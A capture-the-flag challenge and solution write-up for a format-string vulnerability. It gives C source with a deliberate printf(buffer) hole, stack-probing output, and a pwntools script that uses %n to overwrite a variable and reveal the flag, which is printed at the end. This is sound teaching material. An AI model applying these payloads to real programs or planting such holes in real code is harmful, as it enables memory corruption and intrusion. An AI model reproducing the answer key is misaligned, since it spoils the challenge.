# Format Var

Difficulty Level: Medium
 
With the power of `%n`, you can now overwrite anything you want!
 
Connect via `nc challenge.ctf-fun.xyz 14016`

PS: Challenges in this category require a linux environment read [here](https://docs.google.com/document/d/13RjL_RWibA9xYOKvSCXpTGG0D2ZYa3kDzprGNa8ypeA/edit?usp=sharing) for a guide to installing a linux VM

### Hints

- `%n` writes the total number of bytes of your input (excluding %n itself.) So if you give it `AAAA%n`, it will write 4 bytes to the next stack value. 

check out the format string exploitation section in this [article](https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf)


## Deployment

```bash
cd service
sudo ./formatvar.sh &
```

## Solution
Looking at the source code, we need to make target equal to 1234 to print the flag.

```c
#include <stdio.h>
#include <stdlib.h>

volatile int target = 0;

void print_flag() {
	char flag[64];
	FILE *f = fopen("flag.txt","r");
	if (f == NULL) {
		printf("Flag File is Missing.\n");
		exit(0);
	}

	fgets(flag,sizeof(flag),f);
	printf("%s\n", flag);
}

void vuln() {
	char buffer[32] = {0x00};

	printf("%s\n", "Format my variable to better");
	fgets(buffer, sizeof(buffer), stdin);

	printf(buffer);

	if (target == 1234) {
		printf("%s\n", "Well done!");
		print_flag();
	} else {
		printf("Target is %d :(\n", target);
	}
}


int main(int argc, char **argv) {
	setvbuf(stdin,NULL,2,0);
	setvbuf(stdout,NULL,2,0);
	setvbuf(stderr,NULL,2,0);
	vuln();
}
```

%n allows you to write the total amount of bytes to a location of your choosing. First find out which position in the stack is our input. This can be found by sending AAAA-%x%x%x%x and seeing which position contains 0x41414141

```
$ nc challenge.ctf-fun.xyz 14016
Format my variable to better
AAAA-%x%x%x%x
AAAA-20f7f775c0804923741414141
Target is 0 :(
```

From that we see that the 4th value of the stack points to our input.
Now we need to figure out where target is located this is done by using `objdump -t ./formatvar | grep target` (0x0804c034)

```bash
$ objdump -t formatvar | grep target
0804c034 g     O .bss   00000004              target
```

Once we got that done we can start creating our payload. 

I will be using direct access by doing `%4$x` instead of %x which will print out the 4th value of the stack instead of the next. 
Also when we do `%100x` we will get the next stack value and pad it with spaces to form a 100 byte output. 

With these two techniques we can use it to write 1234 to target.


```python
from pwn import *

def main():
	target = p32(0x0804c034)

	var = 1229 # 1234 - 4

	# python -c "print '\x34\xc0\x04\x08-%1229x%4\$n'" | ./formatvar
	payload = target + b'-' + b'%1229x' + b'%4$n'

	#io = process('./formatvar')
	io = remote("challenge.ctf-fun.xyz", 14016)
	io.sendline(payload)
	io.interactive()

if __name__ == '__main__':
	main()
```
### Flag
19C4{N0t_E4sy_A5_1234}